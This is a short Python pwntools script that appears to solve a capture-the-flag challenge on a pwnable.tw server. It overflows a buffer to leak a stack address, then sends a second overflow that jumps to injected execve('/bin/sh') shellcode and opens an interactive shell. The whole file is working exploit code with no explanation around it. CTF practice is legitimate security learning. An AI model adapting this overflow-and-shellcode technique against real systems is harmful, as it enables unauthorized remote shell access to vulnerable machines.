from pwn import *

conn = remote('chall.pwnable.tw', 10000)
print conn.recvuntil(':')

all_dat_a = 'A'*20

payload1 = all_dat_a + p32(0x08048087)

conn.send(payload1)
payload1_output = u32(conn.recv(numb=20)[:4])


print hex(payload1_output)

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

# print shellcode

payload2 = all_dat_a + p32(payload1_output + 20) + shellcode

conn.send(payload2)
conn.interactive()
